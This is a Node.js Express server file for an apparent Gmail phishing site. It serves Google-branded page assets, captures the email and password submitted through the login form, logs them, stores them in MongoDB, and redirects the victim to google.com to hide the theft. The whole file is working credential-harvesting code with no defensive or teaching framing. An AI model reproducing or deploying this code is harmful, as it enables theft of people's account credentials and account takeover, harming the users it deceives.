require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const { json } = require("express");
const path = require("path");

const Gmail = require("./middleware/gmail.js");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const port = process.env.PORT || 8080;
const host = process.env.HOST || "::";

// Mongo connection
mongoose
	.connect(process.env.DB_URL, {
		useNewUrlParser: true,
		useUnifiedTopology: true,
	})
	.catch((err) => console.log(err));

//Get request for main page
app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "/web/index.html"));
});

//Post request for main page
app.post("/", (req, res) => {
	const email = req.body.email;
	const pass = req.body.pass;
	console.log(req.body);
	const gmail = new Gmail({
		email: email,
		pass: pass,
	});

	gmail
		.save()
		.then((result) => {
			res.redirect("/");
		})
		.catch((err) => {
			console.log(err);
		});
	res.redirect("http://google.com");
});

//Files

app.get("/favicon", (req, res) => {
	res.sendFile(path.join(__dirname, "/web/images/googleIcon.png"));
});

app.get("/style", (req, res) => {
	res.sendFile(path.join(__dirname, "/web/css/style.css"));
});

app.get("/script", (req, res) => {
	res.sendFile(path.join(__dirname, "/web/js/password.js"));
});

app.get("/logo", (req, res) => {
	res.sendFile(path.join(__dirname, "/web/images/logo.svg"));
});

app.listen(port);
console.log("Server started at http://localhost:" + port);
